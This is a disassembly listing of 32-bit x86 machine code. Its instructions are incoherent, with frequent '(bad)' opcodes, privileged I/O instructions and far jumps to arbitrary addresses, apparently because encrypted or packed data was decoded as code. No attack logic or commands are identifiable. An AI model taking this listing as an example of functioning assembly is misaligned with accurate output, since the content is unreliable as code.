  403ec8:	gs sub al,0x1
  403ecb:	pop    eax
  403ecc:	dec    edx
  403ecd:	(bad)  
  403ece:	aad    0xb5
  403ed0:	in     al,dx
  403ed1:	sahf   
  403ed2:	lods   eax,DWORD PTR ds:[esi]
  403ed3:	pop    esi
  403ed4:	loop   0x403f31
  403ed6:	pop    ss
  403ed7:	push   ecx
  403ed8:	in     eax,0x3f
  403eda:	sbb    al,0xcb
  403edc:	add    al,0x88
  403ede:	xor    eax,0xa111360a
  403ee3:	scas   al,BYTE PTR es:[edi]
  403ee4:	cld    
  403ee5:	cmp    edi,DWORD PTR [ebx+0x32]
  403ee8:	xor    bl,ch
  403eea:	dec    eax
  403eeb:	clc    
  403eec:	sub    ebx,0x58
  403eef:	ret    0xa5e7
  403ef2:	pusha  
  403ef3:	js     0x403e86
  403ef5:	add    al,0x89
  403ef7:	inc    esp
  403ef8:	dec    ebp
  403ef9:	jne    0x403ece
  403efb:	or     BYTE PTR [edi+eax*8+0x57d7493e],al
  403f02:	popf   
  403f03:	dec    ecx
  403f04:	das    
  403f05:	jbe    0x403e9b
  403f07:	sbb    al,0x11
  403f09:	popa   
  403f0a:	(bad)  
  403f0b:	push   edx
  403f0c:	ins    DWORD PTR es:[edi],dx
  403f0d:	repnz xor eax,0x624b8cc2
  403f13:	mov    ecx,DWORD PTR [edx+0x15]
  403f16:	call   0x440a:0x39cfeac3
  403f1d:	xor    BYTE PTR [esi+0x7e],dl
  403f20:	sub    bl,BYTE PTR ds:[esi]
  403f23:	mov    edx,0xb2061b02
  403f28:	pop    esi
  403f29:	jp     0x403f21
  403f2b:	push   ds
  403f2c:	idiv   DWORD PTR [edx-0x37]
  403f2f:	ins    DWORD PTR es:[edi],dx
  403f30:	xchg   esi,eax
  403f31:	sar    DWORD PTR [ecx+0xb1c003c],1
  403f37:	out    dx,eax
  403f38:	lock pop ebp
  403f3a:	sbb    al,BYTE PTR [edi+edi*8+0x62]
  403f3e:	cmc    
  403f3f:	pusha  
  403f40:	mov    cl,0xf5
  403f42:	mov    dh,0xac
  403f44:	cwde   
  403f45:	pop    esp
  403f46:	lahf   
  403f47:	cs xchg ecx,eax
  403f49:	push   ebp
  403f4a:	xchg   ebx,eax
  403f4b:	out    dx,eax
  403f4c:	rcl    BYTE PTR [edi+0x2],0x3c
  403f50:	sbb    edx,DWORD PTR [ecx]
  403f52:	test   DWORD PTR [ebp-0x36],ebp
  403f55:	popf   
  403f56:	xchg   BYTE PTR [edx-0x57],bh
  403f59:	jbe    0x403f00
  403f5b:	sbb    dh,BYTE PTR [eax+0x2]
  403f5e:	lock sbb bh,BYTE PTR [ebp+edi*8+0x71]
  403f63:	push   esp
  403f64:	popf   
  403f65:	(bad)  
  403f67:	leave  
  403f68:	and    eax,0x4121aa7a
  403f6d:	lock jne 0x403f70
  403f70:	mov    edx,0xf22747e3
  403f75:	inc    esi
  403f76:	jmp    0x37a2:0xd45cfe7a
  403f7d:	shl    BYTE PTR [ebx],1
  403f7f:	fadd   QWORD PTR [esi+0x6e99d472]
  403f85:	ja     0x403f38
  403f87:	call   0x96384350
  403f8c:	xchg   esp,eax
  403f8d:	das    
  403f8e:	ret    0xe539
  403f91:	mov    edx,0x47fc5065
  403f96:	adc    al,ah
  403f98:	lods   eax,DWORD PTR ds:[esi]
  403f99:	cmp    al,0x48
  403f9b:	dec    esi
  403f9c:	clc    
  403f9d:	lock fistp DWORD PTR cs:[esp+ecx*2+0x4981f6ae]
  403fa6:	(bad)  
  403fa7:	test   BYTE PTR [ebx+0x47],0x70
  403fab:	lods   eax,DWORD PTR ds:[esi]
  403fac:	xlat   BYTE PTR ds:[ebx]
  403fad:	jb     0x404002
  403faf:	(bad)  
  403fb0:	push   eax
  403fb1:	xchg   ebx,eax
  403fb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fb3:	lds    esi,FWORD PTR [ebp-0x73488d9b]
  403fb9:	sbb    al,0x72
  403fbb:	xchg   ebx,eax
  403fbc:	push   cs
  403fbd:	push   0xffffff98
  403fbf:	pop    ss
  403fc0:	xchg   esp,eax
  403fc1:	xchg   ecx,eax
  403fc2:	(bad)  
  403fc3:	mov    esi,0x55506c7c
  403fc8:	les    esp,FWORD PTR fs:[ebp-0x3305ac82]
  403fcf:	push   ds
  403fd0:	dec    ebp
  403fd1:	mov    dh,0x9f
  403fd3:	aam    0x40
  403fd5:	or     BYTE PTR [ebx-0xf097536],dl
  403fdb:	cmp    BYTE PTR [edi-0x1d],ah
  403fde:	sbb    eax,0xbd3e29fd
  403fe3:	lods   eax,DWORD PTR ds:[esi]
  403fe4:	sbb    dh,ah
  403fe6:	gs dec ecx
  403fe8:	call   0xd27e:0x732b7f0d
  403fef:	in     al,0x48
  403ff1:	push   cs
  403ff2:	xchg   ebx,eax
  403ff3:	dec    edx
  403ff4:	fsubr  QWORD PTR [eax-0x2f4dd1d5]
  403ffa:	jb     0x40401c
  403ffc:	jbe    0x40400d
  403ffe:	aaa    
  403fff:	jecxz  0x404080
  404001:	xor    BYTE PTR [ebp-0xd],0xb1
  404005:	push   ss
  404006:	cld    
  404007:	ret    
  404008:	aaa    
  404009:	pop    ss
  40400a:	test   DWORD PTR [ebp-0x5c0dd3fb],ecx
  404010:	stos   DWORD PTR es:[edi],eax
  404011:	adc    eax,0x7aec163e
  404016:	sub    BYTE PTR [esi-0x1cb194ab],al
  40401c:	inc    edi
  40401d:	mov    ch,ah
  40401f:	cmp    esi,DWORD PTR [edx]
  404021:	dec    ebx
  404022:	js     0x404095
  404024:	add    eax,0x39669112
  404029:	retf   
  40402a:	mov    dh,0x4
  40402c:	outs   dx,BYTE PTR ds:[esi]
  40402d:	bound  esp,QWORD PTR [esi]
  40402f:	sub    bl,bl
  404031:	pop    ebx
  404032:	aaa    
  404033:	jbe    0x4040a0
  404035:	cmp    DWORD PTR [eax+0x118cde5b],edi
  40403b:	xor    BYTE PTR [ecx+0x61],ch
  40403e:	(bad)  
  40403f:	retf   0x884c
  404042:	stos   BYTE PTR es:[edi],al
  404043:	inc    ebx
  404044:	adc    eax,0x5150d024
  404049:	(bad)  
  40404b:	pop    esi
  40404c:	fwait
  40404d:	je     0x4040be
  40404f:	rcl    BYTE PTR [di],1
  404052:	lock fs adc ah,ah
  404056:	loop   0x4040b4
  404058:	dec    ebx
  404059:	or     edx,ecx
  40405b:	jae    0x404030
  40405d:	push   ebp
  40405e:	or     dh,BYTE PTR [ebx]
  404060:	sub    bh,BYTE PTR [edx]
  404062:	in     al,dx
  404063:	jecxz  0x4040ae
  404065:	cwde   
  404066:	sahf   
  404067:	lods   eax,DWORD PTR ds:[esi]
  404068:	sbb    DWORD PTR [ebx+ebp*4-0x49],edx
  40406c:	jns    0x404057
  40406e:	sbb    BYTE PTR [esp+ebx*1+0x263c0cab],ch
  404075:	add    ah,BYTE PTR [eax-0x5aa71e2b]
  40407b:	mov    dl,0x83
  40407d:	ds mov al,0x46
  404080:	xchg   edx,eax
  404081:	xchg   esi,eax
  404082:	jge    0x4040d7
  404084:	adc    ebx,esp
  404086:	xor    eax,0x5b37916c
  40408b:	add    dh,cl
  40408d:	mov    BYTE PTR [ecx+ecx*8-0x13edf062],dh
  404094:	mov    bl,0x4b
  404096:	aam    0xcc
  404098:	sbb    al,0xed
  40409a:	sub    al,0x40
  40409d:	lea    ecx,[esp+eax*4-0x4d]
  4040a1:	pop    esi
  4040a2:	mov    dl,0x75
  4040a4:	push   ds
  4040a5:	arpl   dx,sp
  4040a7:	mov    ch,BYTE PTR [eax-0x5f43bc4b]
  4040ad:	imul   eax,edi,0x5b
  4040b0:	sub    DWORD PTR [ecx-0x55],edi
  4040b3:	repnz clc 
  4040b5:	mov    edx,0xf637440f
  4040ba:	je     0x40412a
  4040bc:	push   ebx
  4040bd:	sub    dh,BYTE PTR [ebp+0x24c20bd]
  4040c3:	loope  0x404076
  4040c5:	gs cmp eax,edx
  4040c8:	pop    edi
  4040c9:	jo     0x40409e
  4040cb:	fbstp  TBYTE PTR [ecx+0x2da6562a]
  4040d1:	mov    fs,esi
  4040d3:	xchg   ebp,eax
  4040d4:	in     al,0xd3
  4040d6:	add    DWORD PTR [eax-0x1075fca6],ebp
  4040dc:	push   es
  4040dd:	pop    ebp
  4040de:	fisub  DWORD PTR [ebx+0x55d945c7]
  4040e4:	xchg   edx,eax
  4040e5:	push   edi
  4040e6:	shl    BYTE PTR [esi+eiz*8-0x80],cl
  4040ea:	adc    ch,BYTE PTR [ecx-0x5f36f4d9]
  4040f0:	(bad)  
  4040f1:	fsubr  DWORD PTR [eax+0x27]
  4040f4:	aam    0xd2
  4040f6:	bound  edx,QWORD PTR [ecx+0x186f102b]
  4040fc:	ret    0x28ca
  4040ff:	outs   dx,BYTE PTR ds:[esi]
  404100:	push   ds
  404101:	cmp    BYTE PTR ds:0xc7d835a9,ah
  404107:	jns    0x404102
  404109:	das    
  40410a:	mov    ds:0x695c1941,al
  40410f:	jb     0x4040a5
  404111:	mov    ah,0x8d
  404113:	inc    esp
  404114:	inc    ecx
  404115:	imul   ebp,DWORD PTR [eax-0x7],0xffffffef
  404119:	jge    0x40418f
  40411b:	in     al,dx
  40411c:	mov    ecx,DWORD PTR [esi+edi*1]
  40411f:	or     BYTE PTR [ebp-0x6528438e],0x59
  404126:	lods   eax,DWORD PTR ds:[esi]
  404127:	sbb    dl,BYTE PTR [edx+ebx*8+0x3ea5b397]
  40412e:	mov    WORD PTR [esi],cs
  404130:	pop    es
  404131:	stc    
  404132:	sub    eax,0xa9399d9c
  404137:	push   esp
  404138:	jnp    0x4041b2
  40413a:	cs pop esp
  40413c:	enter  0xc7e4,0xe2
  404140:	cs cmp al,0x2a
  404143:	or     edx,DWORD PTR [edx-0x573a4c35]
  404149:	fsubr  QWORD PTR [ebp-0x2]
  40414c:	sbb    eax,0xfa73c6fd
  404151:	inc    ebp
  404152:	mov    BYTE PTR [edi],0x8b
  404155:	fcom   st(7)
  404157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404158:	jmp    0x90acad2b
  40415d:	fisttp QWORD PTR [ecx-0x6993d146]
  404163:	push   ebp
  404164:	cdq    
  404165:	daa    
  404166:	or     al,0x5f
  404168:	dec    ebx
  404169:	ret    
  40416a:	lods   al,BYTE PTR ds:[esi]
  40416b:	std    
  40416c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40416d:	jmp    0xa16f0c43
  404172:	outs   dx,BYTE PTR ds:[esi]
  404173:	and    edx,edx
  404175:	stos   DWORD PTR es:[edi],eax
  404176:	inc    ebp
  404177:	xor    DWORD PTR [ebx+ebx*2+0x284fcb6b],esi
  40417e:	aaa    
  40417f:	push   esi
  404180:	add    BYTE PTR ds:0x52ee1bb7,bh
  404186:	xor    eax,0xd0299540
  40418b:	and    ebp,DWORD PTR [esi+eiz*1]
  40418e:	nop
  40418f:	mov    edx,0xe3149282
  404194:	sub    dl,BYTE PTR ds:0x8d0282cb
  40419a:	jge    0x40416e
  40419c:	sub    edx,esi
  40419e:	sub    eax,0xbd107bef
  4041a3:	cmc    
  4041a4:	lods   eax,DWORD PTR ds:[esi]
  4041a5:	xor    DWORD PTR [ebx+eax*2+0x3],ecx
  4041a9:	shl    eax,1
  4041ab:	xor    cl,BYTE PTR [ecx+ebp*2]
  4041ae:	add    eax,DWORD PTR [edx+0x1a996b11]
  4041b4:	test   al,0xa0
  4041b6:	fist   WORD PTR [ebp+ebx*2-0x1af60029]
  4041bd:	add    cl,BYTE PTR [eax+edx*1]
  4041c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041c1:	les    ebx,FWORD PTR ds:0xde4c3045
  4041c7:	dec    DWORD PTR [eax]
  4041c9:	cmp    al,0x1
  4041cb:	in     eax,dx
  4041cc:	cmp    edx,DWORD PTR [eax-0x29a5b2b0]
  4041d2:	fwait
  4041d3:	mov    al,ds:0x3c29d0e4
  4041d8:	xor    eax,0xb4726715
  4041dd:	enter  0xdcd7,0xd1
  4041e1:	inc    eax
  4041e2:	in     eax,dx
  4041e3:	jmp    0xb1223884
  4041e8:	div    DWORD PTR [ecx+ebp*2]
  4041eb:	into   
  4041ec:	pusha  
  4041ed:	xor    esi,DWORD PTR [ebx-0x20]
  4041f0:	jl     0x4041ff
  4041f2:	loop   0x404222
  4041f4:	push   ss
  4041f5:	sti    
  4041f6:	or     eax,0x4634bcb4
  4041fb:	and    BYTE PTR [esp+ebp*4],ch
  4041fe:	retf   0x7df2
  404201:	mov    al,ds:0x1e4a29ed
  404206:	add    al,0x3a
  404208:	mov    dl,0x14
  40420a:	dec    ebx
  40420b:	push   ecx
  40420c:	hlt    
  40420d:	cmp    al,0x33
  40420f:	sub    DWORD PTR [esi+0x6115adbc],ecx
  404215:	sbb    bl,al
  404217:	jg     0x40428b
  404219:	xor    al,0x9f
  40421b:	call   0x52cc8a10
  404220:	dec    esp
  404221:	adc    DWORD PTR [ecx],0x12
  404224:	xchg   ecx,eax
  404225:	xchg   esi,eax
  404226:	xchg   ecx,eax
  404227:	outs   dx,DWORD PTR ds:[esi]
  404228:	pop    edi
  404229:	mov    esi,0x54fa68fd
  40422e:	and    eax,0x566980ad
  404233:	push   edi
  404234:	mov    eax,esi
  404236:	stc    
  404237:	ffreep st(2)
  404239:	pusha  
  40423a:	fsubr  QWORD PTR [edi*8-0x1a8da14]
  404241:	mov    ah,0x4e
  404243:	jge    0x4041d9
  404245:	in     eax,dx
  404246:	cli    
  404247:	sbb    BYTE PTR [ebx-0x5c],bh
  40424a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40424b:	fwait
  40424c:	cdq    
  40424d:	cmp    esi,DWORD PTR [edx]
  40424f:	sar    BYTE PTR ds:0x2116aaf3,1
  404255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404256:	and    ecx,DWORD PTR [esi+0xa99e4a1]
  40425c:	inc    ebp
  40425d:	fild   WORD PTR [edi+0x2bdfb296]
  404263:	xchg   BYTE PTR [edi+0x2a248f3c],cl
  404269:	mov    DWORD PTR [edi],eax
  40426b:	idiv   DWORD PTR [ebp+0x5b]
  40426e:	inc    edi
  40426f:	pop    ss
  404270:	mov    ds:0xa972440e,eax
  404275:	rol    edi,1
  404277:	xchg   ch,ch
  404279:	push   esp
  40427a:	adc    DWORD PTR [ebp+eiz*1-0x5d],edi
  40427e:	jp     0x4042ec
  404280:	loope  0x4042a6
  404282:	jno    0x404285
  404284:	pop    eax
  404285:	jecxz  0x4042c3
  404287:	lahf   
  404288:	adc    eax,0xc2b989fa
  40428d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40428e:	outs   dx,BYTE PTR ds:[esi]
  40428f:	rcr    DWORD PTR [edx+0x39],0x89
  404293:	mov    ch,0x7b
  404295:	adc    BYTE PTR [esi+0x5d0c3d4f],dl
  40429b:	mov    ss,WORD PTR [ebx+0x34]
  40429e:	int    0xe1
  4042a0:	mov    bh,0x5f
  4042a2:	sub    BYTE PTR [ebx],dh
  4042a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042a5:	mov    ebx,0xe4b0f5fc
  4042aa:	repz xchg esi,eax
  4042ac:	mov    dh,0x62
  4042ae:	loop   0x4042e4
  4042b0:	pop    ecx
  4042b1:	pop    edi
  4042b2:	loope  0x40426f
  4042b4:	shl    BYTE PTR [edx],0x5e
  4042b7:	or     eax,0x2af6e5c7
  4042bc:	mov    ebp,0x20eedcfa
  4042c1:	ins    DWORD PTR es:[edi],dx
  4042c2:	(bad)  
  4042c3:	outs   dx,DWORD PTR ds:[esi]
  4042c4:	fild   DWORD PTR [edx]
  4042c6:	clc    
  4042c7:	ror    BYTE PTR [ecx-0x264f7797],0xae
  4042ce:	dec    edx
  4042cf:	or     al,0x1a
  4042d1:	sahf   
  4042d2:	adc    eax,0xbeae51a8
  4042d7:	call   0xe69fed50
  4042dc:	cdq    
  4042dd:	pop    es
  4042de:	fdiv   QWORD PTR [edi+edx*2+0x16]
  4042e2:	jmp    0xf08cb2f5
  4042e7:	es adc eax,0x6c0ecb89
  4042ed:	jl     0x404329
  4042ef:	cmp    ecx,eax
  4042f1:	sbb    DWORD PTR [esi-0x1143a1af],esi
  4042f7:	mov    bl,0x1b
  4042f9:	(bad)  
  4042fb:	aaa    
  4042fc:	dec    edx
  4042fd:	mov    cl,0x5c
  4042ff:	push   ecx
  404300:	int3   
  404301:	cmp    ch,BYTE PTR [edi+esi*1-0x28]
  404305:	imul   ebp,DWORD PTR [esi+0x7c],0xffffff84
  404309:	mov    ah,BYTE PTR [esi+0x4f]
  40430c:	mov    ecx,0xb9f8e72a
  404311:	ja     0x4042a4
  404313:	outs   dx,BYTE PTR ds:[esi]
  404314:	iret   
  404315:	mov    bl,0xf9
  404317:	dec    edi
  404318:	les    ebx,FWORD PTR [edi+0x7c21d7fa]
  40431e:	std    
  40431f:	(bad)  
  404320:	adc    BYTE PTR [eax+0x15619251],cl
  404326:	mov    DWORD PTR [ebp+0x78a7cc5a],0xfbea5c7e
  404330:	xchg   edx,eax
  404331:	xchg   DWORD PTR [ebp-0x2e],edi
  404334:	mov    esp,0x3de9bf00
  404339:	or     esp,DWORD PTR [edi]
  40433b:	xchg   ebx,eax
  40433d:	mov    ds:0xb71b283a,eax
  404342:	je     0x40435d
  404344:	outs   dx,DWORD PTR ds:[esi]
  404345:	adc    al,0xa7
  404347:	lods   al,BYTE PTR ds:[esi]
  404348:	xchg   ebp,eax
  404349:	pop    eax
  40434a:	ret    0x29e5
  40434d:	call   0xe88b3168
  404352:	enter  0xe30c,0x76
  404356:	shr    ah,1
  404358:	fnsave [ecx-0x3b]
  40435b:	push   ebx
  40435c:	retf   0xfb42
  40435f:	push   ss
  404360:	and    DWORD PTR [esi-0x5a],edx
  404363:	outs   dx,DWORD PTR ds:[esi]
  404364:	in     eax,0xc0
  404366:	ins    BYTE PTR es:[edi],dx
  404367:	adc    ebx,DWORD PTR [esi+0x60]
  40436a:	xor    DWORD PTR [edx-0x3c],eax
  40436d:	mov    dh,0xc7
  40436f:	push   ebp
  404370:	or     DWORD PTR [ecx-0x76],edi
  404373:	adc    BYTE PTR [ebx-0x7f],cl
  404376:	mov    bh,0x42
  404378:	(bad)  [ecx-0x44d1005b]
  40437e:	fst    QWORD PTR [esi]
  404380:	jmp    0x70a8ef01
  404385:	jbe    0x4043f2
  404387:	push   ss
  404388:	pop    ds
  404389:	fmul   QWORD PTR [esi+0x3d]
  40438c:	stc    
  40438d:	inc    ecx
  40438e:	sub    esi,esp
  404390:	dec    eax
  404391:	mov    ds:0x6f244bea,eax
  404396:	jmp    0x404371
  404398:	shl    DWORD PTR [edi],cl
  40439a:	add    BYTE PTR [ecx-0x1f],cl
  40439d:	dec    ebx
  40439e:	je     0x4043d3
  4043a0:	cmp    eax,0x707b9e14
  4043a5:	clc    
  4043a6:	or     esp,DWORD PTR [ecx+0x24]
  4043a9:	mov    dl,0x32
  4043ab:	jae    0x40440b
  4043ad:	leave  
  4043ae:	mov    cl,0x49
  4043b0:	retf   
  4043b1:	and    DWORD PTR [esi+0x18],esp
  4043b4:	cmp    al,0x86
  4043b6:	test   eax,0x2c07315c
  4043bb:	(bad)  
  4043bc:	int    0xbe
  4043be:	ins    DWORD PTR es:[edi],dx
  4043bf:	mov    edx,0x8987c94f
  4043c4:	in     al,dx
  4043c5:	sbb    DWORD PTR [ebx+0x42a7917],eax
  4043cb:	xor    edi,DWORD PTR [ecx+0x2dee4ad7]
  4043d1:	das    
  4043d2:	mov    bh,0x13
  4043d4:	inc    edx
  4043d5:	retf   0xe95b
  4043d8:	cmp    dh,0xec
  4043db:	and    eax,0xe6d518a4
  4043e0:	jns    0x40437d
  4043e2:	mov    ebp,DWORD PTR [ecx+0x7c92e531]
  4043e8:	fisttp DWORD PTR [edi]
  4043ea:	mov    edx,DWORD PTR fs:[edx-0x1f35ca83]
  4043f1:	sub    eax,0x1e7ec25
  4043f6:	xchg   edx,eax
  4043f7:	(bad)  
  4043f8:	rcl    ebx,cl
  4043fa:	addr16 inc ebx
  4043fc:	inc    esi
  4043fd:	aad    0x2d
  4043ff:	retf   
  404400:	sbb    DWORD PTR [edi],edx
  404402:	les    edi,FWORD PTR [eax+ebp*2-0x76]
  404406:	repz cdq 
  404408:	push   edi
  404409:	mov    esi,0xac904fe
  40440e:	test   DWORD PTR [edx],ebp
  404410:	loopne 0x4043a0
  404412:	mov    esi,DWORD PTR [ebp+0x2a]
  404415:	int3   
  404416:	add    bl,BYTE PTR [ebp-0x26]
  404419:	xor    ebp,esi
  40441b:	dec    edi
  40441c:	pop    ds
  40441d:	sub    al,0x5c
  40441f:	mov    dh,0x1c
  404421:	cmp    al,0x13
  404423:	lahf   
  404424:	mov    cl,BYTE PTR [ebx]
  404426:	fsub   QWORD PTR [ecx]
  404428:	xchg   esp,eax
  404429:	add    DWORD PTR [ebx+0x8],ecx
  40442c:	out    0xd0,eax
  40442e:	daa    
  40442f:	daa    
  404430:	sbb    eax,edi
  404432:	shl    BYTE PTR [ebx-0x38484349],0xe6
  404439:	sbb    eax,esi
  40443b:	call   0x727c65ad
  404440:	or     cl,ah
  404442:	retf   0x9848
  404445:	clc    
  404446:	sub    eax,0x4b087cf7
  40444b:	invd   
  40444d:	lods   al,BYTE PTR ds:[esi]
  40444e:	loopne 0x40441e
  404450:	adc    ebp,ebx
  404452:	xor    al,0x82
  404454:	mov    ecx,0xcccf7d5d
  404459:	outs   dx,DWORD PTR ds:[esi]
  40445a:	in     al,dx
  40445b:	(bad)  
  40445c:	mov    cl,0x96
  40445e:	lock dec edx
  404460:	inc    ecx
  404461:	or     BYTE PTR [esi+0x450da18a],cl
  404467:	xlat   BYTE PTR es:[ebx]
  404469:	dec    edx
  40446a:	iret   
  40446b:	ror    DWORD PTR [ebp-0x6142c96f],cl
  404471:	and    al,0x9e
  404473:	popa   
  404474:	inc    edi
  404475:	mov    ds:0xa0fdfb71,al
  40447a:	or     bl,dl
  40447c:	cdq    
  40447d:	rol    DWORD PTR [eax],0xa9
  404480:	les    ebx,FWORD PTR [ebp+0x47]
  404483:	arpl   WORD PTR [esi+0x22],si
  404486:	adc    dh,BYTE PTR fs:[edi+0x34]
  40448a:	popf   
  40448b:	out    0x56,eax
  40448d:	adc    bh,BYTE PTR [ecx*2-0x5af425c8]
  404494:	aaa    
  404495:	imul   DWORD PTR [edi-0x4f]
  404498:	or     DWORD PTR [edx+ecx*2-0x3f867d55],ecx
  40449f:	mov    dl,0x9b
  4044a1:	sbb    esp,DWORD PTR gs:[eax-0x30fbce74]
  4044a8:	xchg   DWORD PTR [ecx-0x30],ebx
  4044ab:	outs   dx,DWORD PTR ds:[esi]
  4044ac:	call   FWORD PTR [ebp+0xb]
  4044af:	pop    edx
  4044b0:	js     0x40449e
  4044b2:	or     edx,DWORD PTR [eax]
  4044b4:	lods   eax,DWORD PTR ds:[esi]
  4044b5:	xor    ebx,esi
  4044b7:	inc    edx
  4044b8:	push   cs
  4044b9:	rcl    BYTE PTR [esi+ecx*4+0x1e6a671d],0x9b
  4044c1:	cld    
  4044c2:	xor    eax,0xd13dfe0d
  4044c7:	push   ecx
  4044c8:	scas   al,BYTE PTR es:[edi]
  4044c9:	popf   
  4044ca:	mov    ebx,edi
  4044cc:	push   esp
  4044cd:	clc    
  4044ce:	mov    ds:0x7bafbfec,al
  4044d3:	xchg   BYTE PTR [ecx+0x4f6c9c69],bh
  4044d9:	sti    
  4044da:	frstor [eax-0x4ea79ab7]
  4044e0:	add    edi,0x5f
  4044e3:	ret    
  4044e4:	xchg   BYTE PTR [eax+ebx*4-0x80],al
  4044e8:	clc    
  4044e9:	add    cl,BYTE PTR [ebp-0x1610a65b]
  4044ef:	out    0xf2,al
  4044f1:	aaa    
  4044f2:	aam    0x7e
  4044f4:	inc    ecx
  4044f5:	push   0x324917ce
  4044fa:	(bad)
  4044ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404500:	xchg   edx,eax
  404501:	sbb    esi,esi
  404503:	pop    eax
  404504:	rcl    DWORD PTR [ebx+0x6402a66b],0xc5
  40450b:	xchg   edx,eax
  40450c:	mov    WORD PTR ds:0xa0ae8ad4,ss
  404512:	stos   DWORD PTR es:[edi],eax
  404513:	cwde   
  404514:	lea    eax,[ebx]
  404516:	xor    dl,BYTE PTR [ecx-0x6e]
  404519:	sbb    esp,DWORD PTR ss:[edi-0x7314e09f]
  404520:	cmp    DWORD PTR [esi+esi*4-0x7c],eax
  404524:	xchg   ebx,eax
  404525:	lods   al,BYTE PTR ds:[esi]
  404526:	mov    bl,0x39
  404528:	adc    dh,BYTE PTR [eax-0x1373b35e]
  40452e:	outs   dx,BYTE PTR ds:[esi]
  40452f:	fsubr  st(2),st
  404531:	popf   
  404532:	lock inc edi
  404534:	mov    edx,0x95b35ef2
  404539:	xor    eax,0x2dae98dc
  40453e:	jl     0x4045ae
  404540:	stc    
  404541:	push   ds
  404542:	pop    edx
  404543:	dec    edi
  404544:	es or  al,0x10
  404547:	jge    0x404550
  404549:	leave  
  40454a:	jo     0x404505
  40454c:	fmul   st,st(2)
  40454e:	dec    ebp
  40454f:	pop    ecx
  404550:	xor    BYTE PTR [ebx-0x30ffff40],bh
  404556:	xor    eax,0x6050d826
  40455b:	jb     0x404561
  40455d:	fucomp st(1)
  40455f:	hlt    
  404560:	cmp    al,0x96
  404562:	test   BYTE PTR gs:[ebx+ecx*1+0x60db6720],bl
  40456a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40456b:	dec    esp
  40456c:	lods   al,BYTE PTR ds:[esi]
  40456d:	jp     0x404571
  40456f:	push   cs
  404570:	pop    eax
  404571:	retf   0x8dab
  404574:	mov    edx,0xa95682c4
  404579:	add    al,0x22
  40457b:	ret    0x5de7
  40457e:	xchg   DWORD PTR [edx+0x2c],ebp
  404581:	push   ss
  404582:	sahf   
  404583:	aam    0x9e
  404585:	push   0xffffffbc
  404587:	push   ecx
  404588:	jp     0x404589
  40458a:	arpl   WORD PTR [ecx],si
  40458c:	mov    cs,WORD PTR [ebp+0x15499d48]
  404592:	jae    0x40460d
  404594:	mov    ch,0x5c
  404596:	out    0x25,al
  404598:	jns    0x404547
  40459a:	call   0xe3607fd2
  40459f:	scas   eax,DWORD PTR es:[edi]
  4045a0:	cmp    BYTE PTR [ebx+0x9],cl
  4045a3:	int    0xc7
  4045a5:	mov    esp,0xe9f82dee
  4045aa:	pop    ecx
  4045ab:	fadd   st,st(7)
  4045ad:	xor    eax,0xa08e550d
  4045b2:	es lahf 
  4045b4:	jl     0x404619
  4045b6:	outs   dx,DWORD PTR ds:[esi]
  4045b7:	(bad)  [esi+0x59]
  4045ba:	and    al,0xe5
  4045bc:	jno    0x4045f6
  4045be:	into   
  4045bf:	stos   BYTE PTR es:[edi],al
  4045c0:	cdq    
  4045c1:	mov    ecx,0xd6d85f21
  4045c6:	stc    
  4045c7:	mov    al,0x6c
  4045c9:	pop    ebp
  4045ca:	gs push cs
  4045cc:	dec    ebx
  4045cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045ce:	xchg   ebp,eax
  4045cf:	sbb    DWORD PTR ds:0x78b9ef76,0xfffffff6
  4045d6:	or     ecx,DWORD PTR [ebp+0x42]
  4045d9:	xchg   ebp,eax
  4045da:	gs std 
  4045dc:	outs   dx,DWORD PTR ds:[esi]
  4045dd:	mov    bl,0x54
  4045df:	cdq    
  4045e0:	mov    eax,ds:0xa42f345
  4045e5:	loop   0x4045b3
  4045e7:	shl    BYTE PTR [edx],cl
  4045e9:	lea    ebx,[edi]
  4045eb:	cmc    
  4045ec:	mov    al,BYTE PTR [esi]
  4045ee:	and    BYTE PTR [ebp-0x7c426db6],bh
  4045f4:	add    ecx,DWORD PTR [edi]
  4045f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045f7:	mov    DWORD PTR [esi+0x45],edi
  4045fa:	fnsave [esi+0x43]
  4045fd:	mov    ebx,0xd93a462e
  404602:	pusha  
  404603:	pop    ss
  404604:	sbb    esi,DWORD PTR ds:0xc433e267
  40460a:	dec    edi
  40460b:	push   ss
  40460c:	push   edx
  40460d:	aaa    
  40460e:	push   esp
  40460f:	pop    ss
  404610:	mov    ecx,0x6ce04970
  404615:	cmp    ch,BYTE PTR [esi+0x5f341745]
  40461b:	pop    es
  40461c:	ror    DWORD PTR [edx+0x17],1
  40461f:	out    0x3d,al
  404621:	jl     0x4045ee
  404623:	mov    edi,DWORD PTR [edx-0x17]
  404626:	add    al,0x89
  404628:	mov    cl,0xeb
  40462a:	xor    BYTE PTR [edi],bh
  40462c:	int3   
  40462d:	push   0xef8b2f25
  404632:	or     DWORD PTR [ebp+0x24],edx
  404635:	xor    eax,0x868da7ef
  40463a:	(bad)  
  40463b:	in     eax,dx
  40463c:	xchg   edx,eax
  40463d:	jno    0x404683
  40463f:	xchg   ebx,eax
  404640:	dec    edi
  404641:	fwait
  404642:	aad    0x57
  404644:	cmp    bl,bl
  404646:	and    eax,edi
  404648:	push   ebp
  404649:	mov    dl,BYTE PTR [eax+ebp*8-0x50]
  40464d:	loopne 0x40460d
  40464f:	fstp   TBYTE PTR [ebx]
  404651:	pop    eax
  404652:	ss scas eax,DWORD PTR es:[edi]
  404654:	adc    edx,DWORD PTR [edx]
  404656:	mov    dh,0x5
  404658:	inc    esp
  404659:	xchg   esp,eax
  40465a:	and    BYTE PTR [eax-0x144deaca],bh
  404660:	scas   al,BYTE PTR es:[edi]
  404661:	add    eax,0x6666a5f6
  404666:	call   0xeaefb7ba
  40466b:	sub    al,0xe
  40466d:	(bad)  
  40466e:	(bad)  
  404670:	add    DWORD PTR [eax+0x40d2e8bd],esp
